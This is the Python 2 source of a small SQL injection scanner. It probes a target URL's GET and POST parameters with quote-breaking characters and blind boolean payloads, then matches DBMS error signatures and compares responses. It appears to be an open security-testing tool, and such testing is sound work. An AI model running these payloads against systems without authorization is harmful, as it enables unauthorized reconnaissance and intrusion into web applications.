#!/usr/bin/env python

import difflib, httplib, itertools, optparse, random, re, urllib2, urlparse

NAME    = "Damn Small SQLi Scanner (DSSS) < 100 LOC (Lines of Code)"
VERSION = "0.2"
AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
LICENSE = "Public domain (FREE)"

INVALID_SQL_CHAR_POOL = ('(', ')', '\'', '"')           # characters used for SQL poisoning of parameter values
PREFIXES = (" ", ") ", "' ", "') ", "\"")               # prefix values used for building testing blind payloads
SUFFIXES = ("", "-- ", "#")                             # suffix values used for building testing blind payloads
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d=%d)")         # boolean tests used for building testing blind payloads
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer" # optional HTTP header names
GET, POST = "GET", "POST"                               # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = range(4)                  # enumerator-like values used for marking content type
MIN_BOOL_VAL, MAX_BOOL_VAL = 100, 255                   # minimum and maximum random range values used in boolean tests
FUZZY_THRESHOLD = 0.95                                  # ratio value in range (0,1) used for distinguishing True from False responses

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*")
}

_headers = {}                                           # used for storing dictionary with optional header values

def retrieve_content(url, data=None):
    retval = {HTTPCODE: httplib.OK}
    try:
        req = urllib2.Request("".join(url[i].replace(' ', '%20') if i > url.find('?') else url[i] for i in xrange(len(url))), data, _headers)
        retval[HTML] = urllib2.urlopen(req).read()
    except Exception, ex:
        retval[HTTPCODE] = getattr(ex, "code", None)
        retval[HTML] = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", str())
    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    return retval

def scan_page(url, data=None):
    retval, usable = False, False
    try:
        for phase in (GET, POST):
            current = url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>\w+)=)(?P<value>[^&]+)", current):
                vulnerable, usable = False, True
                print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                tampered = current.replace(match.group(0), "%s%s" % (match.group(0), "".join(random.sample(INVALID_SQL_CHAR_POOL, len(INVALID_SQL_CHAR_POOL)))))
                content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                for dbms in DBMS_ERRORS:
                    for regex in DBMS_ERRORS[dbms]:
                        if not vulnerable and re.search(regex, content[HTML], re.I):
                            print " (i) %s parameter '%s' could be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms)
                            retval = vulnerable = True
                vulnerable = False
                original = retrieve_content(current, data) if phase is GET else retrieve_content(url, current)
                left, right = random.sample(xrange(MIN_BOOL_VAL, MAX_BOOL_VAL + 1), 2)
                for prefix, boolean, suffix in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES):
                    if not vulnerable:
                        template = "%s%s%s" % (prefix, boolean, suffix)
                        payloads = dict((x, current.replace(match.group(0), "%s%s" % (match.group(0), (template % (left, left if x else right))))) for x in (True, False))
                        contents = dict((x, retrieve_content(payloads[x], data) if phase is GET else retrieve_content(url, payloads[x])) for x in (True, False))
                        if any(original[x] == contents[True][x] != contents[False][x] for x in (HTTPCODE, TITLE)) or len(original[TEXT]) == len(contents[True][TEXT]) != len(contents[False][TEXT]):
                            vulnerable = True
                        else:
                            ratios = dict((x, difflib.SequenceMatcher(None, original[TEXT], contents[x][TEXT]).quick_ratio()) for x in (True, False))
                            vulnerable = ratios[True] > FUZZY_THRESHOLD and ratios[False] < FUZZY_THRESHOLD
                        if vulnerable:
                            print " (i) %s parameter '%s' appears to be blind SQLi vulnerable" % (phase, match.group("parameter"))
                            retval = True
        if not usable:
            print " (x) no usable GET/POST parameters found"
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    if proxy:
        urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})))
    _headers.update(dict(filter(lambda item: item[1], [(COOKIE, cookie), (UA, ua), (REFERER, referer)])))

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.htm?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    options, _ = parser.parse_args()
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()